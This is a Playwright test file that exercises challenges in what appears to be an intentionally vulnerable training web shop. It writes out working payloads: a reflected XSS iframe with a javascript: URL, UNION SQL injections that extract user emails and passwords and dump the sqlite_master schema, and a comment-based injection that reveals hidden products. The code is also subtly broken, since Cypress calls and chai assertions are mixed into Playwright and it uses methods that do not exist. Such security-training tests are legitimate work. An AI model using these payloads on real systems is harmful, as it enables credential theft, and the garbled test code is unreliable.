import { test, expect } from '@playwright/test';

test.beforeEach(async ({ context }) => {
  await context.addCookies([
    { name: 'cookieconsent_status', value: 'dismiss' },
    { name: 'welcomebanner_status', value: 'dismiss' },
    { name: 'language', value: 'en' },
  ]);
});

test.describe('/#/search', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/#/search');
  });

  test.describe('challenge "localXssChallenge"', () => {
    test('search query should be susceptible to reflected XSS attacks', async ({ page }) => {
      await page.locator('#searchQuery').click();
      await page.locator('app-mat-search-bar input').type('<iframe src="javascript:alert(`xss`)">');
      await page.locator('app-mat-search-bar input').type('Enter');
      await page.waitForSelector('alert dialog', { state: 'visible' });
      await page.pause();
      expect(page).toHaveDialog({ message: 'xss' });
      await page.screenshot({ path: 'localXssChallenge.png' });
    });
  });

  test('search query should safely handle arbitrary user input', async ({ page }) => {
    await page.locator('#searchQuery').click();
    await page.locator('app-mat-search-bar input').type('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>');
    await page.locator('app-mat-search-bar input').type('Enter');
    await page.waitForTimeout(2000); // Give the page some time to process the input
  });
});

test.describe('/rest/products/search', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/rest/products/search');
  });

  test('challenge "unionSqlInjectionChallenge"', async ({ page }) => {
    await page.evaluate(() => {
      fetch('/rest/products/search?q=%27))%20union%20select%20id%2C%272%27%2C%273%27%2Cemail%2Cpassword%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20from%20users--')
        .then(response => response.json())
        .then(body => {
          expect(body).to.have.property('challenge', 'User Credentials');
        });
    });
  });

  test('challenge "dbSchemaChallenge"', async ({ page }) => {
    await page.evaluate(() => {
      fetch('/rest/products/search?q=%27))%20union%20select%20sql%2C%272%27%2C%273%27%2C%274%27%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20from%20sqlite_master--')
        .then(response => response.json())
        .then(body => {
          expect(body).to.have.property('challenge', 'Database Schema');
        });
    });
  });

  test.beforeEach(async ({ page }) => {
    await page.evaluate(async () => {
      const response = await fetch('/rest/products/search?q=%27))--');
      const sourceContent = await response.json();
      return sourceContent.data;
    });
  });

  test('challenge "dlpPastebinLeakChallenge"', async ({ page }) => {
    const pastebinLeakProduct = await page.evaluate(async () => {
      const product = await window.task('GetPastebinLeakProduct');
      return product;
    });

    const foundProduct = page.evaluate((sourceContent, pastebinLeakProduct) => {
      let foundProduct = false;

      sourceContent.forEach((product) => {
        if (product.name === pastebinLeakProduct.name) {
          foundProduct = true;
        }
      });

      return foundProduct;
    }, page.evaluateResult(), pastebinLeakProduct);

    expect(foundProduct).toBe(true);
  });

  test('challenge "christmasSpecialChallenge"', async ({ page }) => {
    await page.evaluate(async () => {
      const response = await fetch('/rest/products/search?q=%27))--');
      const sourceContent = await response.json();
      const christmasProduct = await window.task('GetChristmasProduct');
      const foundProduct = sourceContent.data.find((product) => product.name === christmasProduct.name);

      if (foundProduct) {
        const bid = sessionStorage.getItem('bid');
        const response2 = await fetch(`${Cypress.config('baseUrl')}/api/BasketItems/`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({
            BasketId: bid,
            ProductId: foundProduct.id,
            quantity: 1
          })
        });

        if (response2.status === 201) {
          console.log('Success');
        }
      }
    });

    await page.goto('/#/basket');
    await page.locator('#checkoutButton').click();
    await page.waitForSelector('.alert-success', { state: 'visible' });
    expect(page).toHaveText(/Christmas Special/, { count: 1 });
  });
});
